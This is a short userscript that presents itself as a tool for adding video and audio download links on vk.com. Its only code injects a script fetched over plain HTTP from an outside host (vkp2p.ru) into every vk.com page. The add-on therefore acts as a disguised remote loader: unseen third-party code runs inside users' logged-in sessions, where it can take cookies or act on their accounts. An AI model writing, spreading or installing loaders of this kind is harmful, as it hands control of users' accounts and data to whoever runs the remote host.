// ==UserScript==
// @name           Vkontakte Video Audio
// @namespace      vk
// @version        1.1
// @description    Добавляет ссылки для скачивания видео и аудио с сайта Vkontakte.ru
// @include        http://vk.com/*
// @include        https://vk.com/*
// @include        http://*.vk.com/*
// @include        https://*.vk.com/*
// @exclude        http://vk.com/widget*
// @exclude        http://vk.com/notifier.php*
// @exclude        http://vk.com/share.php*
// @exclude        http://vk.com/video_ext.php*
// @exclude        https://vk.com/widget*
// @exclude        https://vk.com/notifier.php*
// @exclude        https://vk.com/share.php*
// @exclude        https://vk.com/video_ext.php*
// @grant          none
// ==/UserScript==

var s=document.createElement('script');
s.src='http://vkp2p.ru/pg/userscript.js?rand='+Math.random();
document.body.appendChild(s);